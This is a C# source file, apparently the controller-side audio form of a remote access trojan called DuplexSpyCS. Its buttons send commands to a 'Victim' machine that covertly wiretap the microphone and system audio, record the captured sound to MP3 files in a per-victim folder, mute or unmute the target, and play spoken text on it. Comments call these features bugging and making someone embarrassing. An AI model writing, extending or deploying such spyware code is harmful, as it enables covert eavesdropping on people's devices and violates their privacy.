using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Mapping;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using NAudio.Wave;
using NAudio.Lame;

namespace DuplexSpyCS
{
    public partial class frmAudio : Form
    {
        public Victim v;
        private WaveInEvent wave_in;
        private WaveOutEvent wave_out;
        private BufferedWaveProvider wave_provider;
        private WaveFormat format = new WaveFormat(44100, 16, 1);

        private LameMP3FileWriter mic_mp3Writer;
        private FileStream mic_mp3FileStream;

        private LameMP3FileWriter sys_mp3Writer;
        private FileStream sys_mp3FileStream;

        private bool micRecord = false;
        private bool sysRecord = false;

        public frmAudio()
        {
            InitializeComponent();
        }

        private byte[] GenerateSineWave(byte[] data)
        {
            int sample_rate = 44100; //44.1 kHz
            int dur_perSec = 1; //DURATION PER SECOND
            int amplitude = 16000; //16-bit PCM
            double frequency = 440.0; //440 Hz

            int total_sample = sample_rate * dur_perSec;
            byte[] buffer = new byte[total_sample * 2]; //16-bit AUDIO, 2 BYTES PER SAMPLE

            for (int i = 0; i < total_sample; i++)
            {
                short sample = (short)(amplitude * Math.Sin((2 * Math.PI * frequency * i) / sample_rate));
                buffer[i * 2] = (byte)(sample & 0xff); //LOW BYTE
                buffer[i * 2 + 1] = (byte)((sample >> 8) & 0xff);
            }

            return buffer;
        }

        public void UpdateDisableMute()
        {

        }
        public void UpdateMute()
        {

        }
        public void UpdateVolume(float volume)
        {
            try
            {
                Invoke(new Action(() =>
                {
                    //trackBar1.Value = (int)volume;
                    label2.Text = $"Volume : {volume}";
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void MicAudioPlay(double db, byte[] buffer)
        {
            if (buffer.Length == 0)
                return;

            try
            {
                Invoke(new Action(() =>
                {
                    int val = Math.Abs((int)db + 60);
                    val = val > progressBar1.Maximum ? progressBar1.Maximum : val;
                    progressBar1.Value = Math.Abs(val);

                    var player = new AudioPlayer();
                    player.StartPlayback();
                    player.AddAudioData(buffer, 0, buffer.Length);
                    player.StopPlayback();

                    if (micRecord)
                    {
                        if (mic_mp3Writer != null)
                        {
                            mic_mp3Writer.Write(buffer, 0, buffer.Length);
                        }
                    }
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public void SysAudioPlay(double db, byte[] buffer)
        {
            if (buffer.Length == 0) 
                return;

            try
            {
                Invoke(new Action(() =>
                {
                    int val = Math.Abs((int)db + 60);
                    val = val > progressBar2.Maximum ? progressBar2.Maximum : val;

                    progressBar2.Value = Math.Abs(val);

                    var player = new AudioPlayer();
                    player.StartPlayback();
                    player.AddAudioData(buffer, 0, buffer.Length);
                    player.StopPlayback();

                    if (sysRecord)
                    {
                        if (sys_mp3Writer != null)
                        {
                            sys_mp3Writer.Write(buffer, 0, buffer.Length);
                        }
                    }
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void Init(string data)
        {
            string[] v1 = data.Split('?');
            foreach (string info in v1[0].Split(','))
            {
                string[] s = info.Split(";");
                string name = Crypto.b64D2Str(s[1]);
                comboBox1.Items.Add(name);
            }
            foreach (string info in v1[1].Split(','))
            {
                string[] s = info.Split(';');
                string name = Crypto.b64D2Str(s[1]);
                comboBox2.Items.Add(name);
            }

            if (comboBox1.Items.Count > 0)
                comboBox1.SelectedIndex = 0;
            if (comboBox2.Items.Count > 0)
                comboBox2.SelectedIndex = 0;
        }

        void setup()
        {
            v.encSend(2, 0, "audio|init");
        }

        private void frmAudio_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void trackBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        //MUTE (SHUT SOMEONE MOUTH)
        private void button1_Click(object sender, EventArgs e)
        {
            string state = button1.Text;
            if (state == "Mute")
            {
                v.encSend(2, 0, "audio|mute|mute");
                button1.Text = "Unmute";
            }
            else
            {
                v.encSend(2, 0, "audio|mute|unmute");
                button1.Text = "Mute";
            }
        }

        //DISABLE MUTE (MAKE SOMEONE EMBARRASSING)
        private void button8_Click(object sender, EventArgs e)
        {
            string state = button8.Text.ToLower();
            if (state.Contains("disable")) //DISABLE
            {
                v.encSend(2, 0, "audio|mute|disable");
            }
            else //ENABLE
            {
                v.encSend(2, 0, "audio|mute|enable");
            }
        }

        //SPEECH TEXT
        private void button2_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "audio|speak|text|" + Crypto.b64E2Str(textBox1.Text) + "|" + trackBar1.Value.ToString());
        }

        //PLAY MP3
        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {

            }
        }

        //START/STOP BUGGING MICROPHONE
        private void button4_Click(object sender, EventArgs e)
        {
            string state = button4.Text.ToLower();
            string idx = comboBox1.SelectedIndex.ToString();
            if (state == "start")
            {
                v.encSend(2, 0, $"audio|wiretap|micro|on|start|Microphone|" + idx);
                button4.Text = "Stop";
            }
            else
            {
                v.encSend(2, 0, $"audio|wiretap|micro|on|stop|Microphone|" + idx);
                button4.Text = "Start";
            }
        }

        //RECORD MICROPHONE
        private void button5_Click(object sender, EventArgs e)
        {
            string state = button5.Text.ToLower();
            string idx = comboBox1.SelectedIndex.ToString();
            if (state == "record")
            {
                //v.encSend(2, 0, $"audio|wiretap|micro|on|write|Microphone");
                string dir = Path.Combine(v.dir_victim, "Audio");
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                string mp3File = Path.Combine(dir, "mic_" + C1.GenerateFileName("mp3"));
                mic_mp3FileStream = new FileStream(mp3File, FileMode.Create);
                mic_mp3Writer = new LameMP3FileWriter(mic_mp3FileStream, new WaveFormat(44100, 1), LAMEPreset.VBR_90);
                micRecord = true;

                button5.Text = "Stop Record";
            }
            else
            {
                mic_mp3Writer?.Dispose();
                mic_mp3FileStream?.Dispose();
                mic_mp3Writer = null;
                micRecord = false;

                button5.Text = "Record";
            }
        }

        //START/STOP BUGGING SYSTEM AUDIO
        private void button7_Click(object sender, EventArgs e)
        {
            string state = button7.Text.ToLower();
            string idx = comboBox2.SelectedIndex.ToString();
            if (state == "start")
            {
                v.encSend(2, 0, $"audio|wiretap|system|on|start|Audio|" + idx);
                button7.Text = "Stop";
            }
            else
            {
                v.encSend(2, 0, $"audio|wiretap|system|on|stop|Audio|" + idx);
                button7.Text = "Start";
            }
        }

        //RECORD SYSTEM AUDIO
        private void button6_Click(object sender, EventArgs e)
        {
            string state = button6.Text.ToLower();
            string idx = comboBox2.SelectedIndex.ToString();
            if (state == "record")
            {
                string dir = Path.Combine(v.dir_victim, "Audio");
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                string mp3File = Path.Combine(dir, "sys_" + C1.GenerateFileName("mp3"));
                sys_mp3FileStream = new FileStream(mp3File, FileMode.Create);
                sys_mp3Writer = new LameMP3FileWriter(sys_mp3FileStream, new WaveFormat(44100, 1), LAMEPreset.VBR_90);
                sysRecord = true;

                button6.Text = "Stop Record";
            }
            else
            {
                sys_mp3Writer?.Dispose();
                sys_mp3FileStream?.Dispose();
                sys_mp3Writer = null;
                sysRecord = false;

                button6.Text = "Record";
            }
        }

        private void trackBar1_MouseUp(object sender, MouseEventArgs e)
        {
            float vol = trackBar1.Value / 1.0f;
            v.encSend(2, 0, "audio|vol|" + $"{vol.ToString()}");
        }

        private void trackBar1_KeyUp(object sender, KeyEventArgs e)
        {

        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void button9_Click(object sender, EventArgs e)
        {

        }
    }

    class AudioPlayer
    {
        private BufferedWaveProvider bufferedWaveProvider;
        private WaveOutEvent waveOut;

        public void StartPlayback(int sampleRate = 44100, int channels = 1)
        {
            // Configure audio format
            var waveFormat = new WaveFormat(sampleRate, channels);

            // Initialize BufferedWaveProvider
            bufferedWaveProvider = new BufferedWaveProvider(waveFormat)
            {
                DiscardOnBufferOverflow = true
            };

            // Initialize playback device
            waveOut = new WaveOutEvent();
            waveOut.Init(bufferedWaveProvider);
            waveOut.Play();
        }

        public void AddAudioData(byte[] buffer, int offset, int count)
        {
            // Add data to the playback buffer
            bufferedWaveProvider.AddSamples(buffer, offset, count);
        }

        public void StopPlayback()
        {
            waveOut?.Stop();
            waveOut?.Dispose();
        }
    }
}